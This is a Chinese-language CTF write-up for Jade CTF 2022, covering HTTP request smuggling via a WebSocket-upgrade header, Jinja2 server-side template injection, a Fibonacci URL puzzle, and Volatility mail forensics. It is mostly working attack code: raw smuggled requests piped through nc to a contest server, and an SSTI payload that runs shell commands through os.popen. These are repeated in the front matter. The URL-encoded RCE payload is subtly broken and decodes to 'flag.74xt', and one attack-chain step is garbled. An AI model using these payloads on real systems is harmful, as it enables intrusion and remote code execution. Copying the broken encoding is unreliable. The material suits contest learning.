---
title: Jade CTF WP (HTTP smuggling / SSTI / 邮件取证)
contest: Jade CTF
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [HTTP smuggling, WebSocket upgrade, SSTI, Jinja2 lipsum, mbox 邮件取证, vol.py dumpfiles]
attack_chain: |
  1. HTTP request smuggling 1: GET / HTTP/1.1 + Host: 34.76.206.46:10014 + Content-Length: 85 + Sec-Websocket-Key1: x 触发 Server 把"xxxxxxxx..."当成下一个请求 → 内部 GET /internal?username=n00b → n00b 用户名
  2. HTTP smuggling 2: 二次注入 username={{9*9}} → 81 → SSTI 确认
  3. SSTI payload: username={{lipsum.__globals__['os'].popen('cat flag.txt').read()}}
  4. C 端口 10014 attack chain:
     - 第一请求: GET /cat 触发 server 把内部请求送到 /internal?username=...
     - 第二请求: 内部 username=lipsum.__globals__['os'].popen('cat flag.txt').read()
  5. Fib fib(i) 数列 + URL /?page=fib(i) → 拼出 flag
  6. 内存取证: vol.py -f sandeep.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ed6c9c0 → 邮件 .eml 文件
  7. mbox 解析: jade8stoner@gmail.com → pearl8stoner@gmail.com → NWIyYjdmMDUyMzczMDU2MTFmMzM2ODIxNGQzYTYwMWQ0MzI1NzQwZg== base64
key_payload: |
  # HTTP smuggling 1 (n00b 用户名探测):
  echo -en "GET / HTTP/1.1\r\nHost: 34.76.206.46:10014\r\nContent-Length: 85\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /internal?username=n00b HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc 34.76.206.46 10014
  
  # HTTP smuggling 2 (SSTI 81 确认):
  echo -en "GET /cat HTTP/1.1\r\nHost: 34.76.206.46:10014\r\nContent-Length: 96\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /internal?username=%7b%7b9*9%7d%7d HTTP/1.1\r\nHost: localhost\r\nContent-Length: 36\r\n\r\nGET /c HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc 34.76.206.46 10014
  
  # SSTI Jinja2 (URL encode):
  echo -en "GET /cat HTTP/1.1\r\nHost: 34.76.206.46:10014\r\nContent-Length: 252\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%63%61%74%20%66%6c%61%67%2e74%78%74%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1\r\nHost: localhost\r\nContent-Length: 36\r\n\r\nGET /c HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc 34.76.206.46 10014
  
  # Fib 数列拼图:
  def fib(n):
      a, b = 1, 1
      for i in range(n - 1):
          a, b = b, a + b
      return a
  flag = ""
  for i in range(2, 100):
      r1 = requests.get(url + str(fib(i)))
      flag += r1.text
  print(flag)
  
  # 内存取证:
  python vol.py -f ./workspace/sandeep.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ed6c9c0 -D ./workspace/
one_liner: Jade CTF 2022 多类目 writeup (HTTP request smuggling via WebSocket upgrade / Jinja2 SSTI / vol.py mbox 邮件取证)。
lesson: |
  - HTTP/1.1 + Content-Length + Sec-Websocket-Key1 组合触发 server 把 body 当成下一个请求
  - 这种 smuggling 把内部端口的 HTTP 服务暴露给外部
  - username={{9*9}} 注入 81 确认 Jinja2 SSTI
  - lipsum.__globals__['os'].popen(...).read() 是 Jinja2 SSTI 经典链
  - vol.py dumpfiles -Q <vaddr> 从内存镜像里 dump 任意对象
  - mbox 邮件用 base64 字符串藏密码是 forensics 经典
quality: medium
---

# Jade CTF WP

> 来源: ctfiot.com 68004

## HTTP Request Smuggling (WebSocket upgrade)

端口 10014 服务接受带 `Sec-Websocket-Key1: x` 的 GET 请求，触发 server 把请求 body 的内容当成下一个 HTTP 请求。

### Smuggling 1: 探测内部 n00b 用户

```bash
echo -en "GET / HTTP/1.1\r\n\
Host: 34.76.206.46:10014\r\n\
Content-Length: 85\r\n\
Sec-Websocket-Key1: x\r\n\
\r\n\
xxxxxxxxGET /internal?username=n00b HTTP/1.1\r\n\
Host: localhost\r\n\
Content-Length: 35\r\n\
\r\n\
GET / HTTP/1.1\r\n\
Host: localhost\r\n\
\r\n" | nc 34.76.206.46 10014
```

服务器把 `xxxxxxxx` 后面的内容当成下一个请求 → 访问内部 `/internal?username=n00b` → 拿到 n00b 用户信息。

### Smuggling 2: SSTI 确认 (Jinja2 81)

```bash
echo -en "GET /cat HTTP/1.1\r\n\
Host: 34.76.206.46:10014\r\n\
Content-Length: 96\r\n\
Sec-Websocket-Key1: x\r\n\
\r\n\
xxxxxxxxGET /internal?username=%7b%7b9*9%7d%7d HTTP/1.1\r\n\
Host: localhost\r\n\
Content-Length: 36\r\n\
\r\n\
GET /c HTTP/1.1\r\n\
Host: localhost\r\n\
\r\n" | nc 34.76.206.46 10014
```

`{{9*9}}` URL encode 为 `%7b%7b9*9%7d%7d`，响应中看到 `81` → Jinja2 SSTI 确认。

### SSTI RCE (Jinja2 lipsum)

```bash
echo -en "GET /cat HTTP/1.1\r\n\
Host: 34.76.206.46:10014\r\n\
Content-Length: 252\r\n\
Sec-Websocket-Key1: x\r\n\
\r\n\
xxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%63%61%74%20%66%6c%61%67%2e74%78%74%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1\r\n\
Host: localhost\r\n\
Content-Length: 36\r\n\
\r\n\
GET /c HTTP/1.1\r\n\
Host: localhost\r\n\
\r\n" | nc 34.76.206.46 10014
```

`{{lipsum.__globals__['os'].popen('cat flag.txt').read()}}` URL encode 后塞进 username。

## Fib 数列拼图 (端口 10008)

```python
import requests
url = "http://34.76.206.46:10008/?page="
flag = ""
def fib(n):
    a, b = 1, 1
    for i in range(n - 1):
        a, b = b, a + b
    return a
for i in range(2, 100):
    r1 = requests.get(url + str(fib(i)))
    flag += r1.text
print(flag)
```

`/page=1,1,2,3,5,8,13,21,...` → 拼出 flag。

## Forensics (Win7SP1x64 内存镜像 + mbox)

```bash
python vol.py -f ./workspace/sandeep.raw --profile=Win7SP1x64 dumpfiles \
    -Q 0x000000007ed6c9c0 -D ./workspace/
python vol.py -f ./workspace/sandeep.raw --profile=Win7SP1x64 \
    dumpfiles -Q 0x000000007dec85f0 -D ./workspace/
```

`From: jade8stoner@gmail.com` → `To: pearl8stoner@gmail.com` → `NWIyYjdmMDUyMzczMDU2MTFmMzM2ODIxNGQzYTYwMWQ0MzI1NzQwZg==` → base64 解码 → 密码。

## 评价

Jade CTF 2022 狼组搬运，4 道题分别覆盖 HTTP Request Smuggling (WebSocket upgrade 触发) / Jinja2 SSTI / Fib 数列 / vol.py mbox 取证。

**HTTP Smuggling via WebSocket upgrade** 是冷门但经典的攻击面：很多老 server 看到 `Sec-Websocket-Key1` 会切换到 WebSocket 模式但仍接受 HTTP body，把 body 内容当成下一条请求转发。
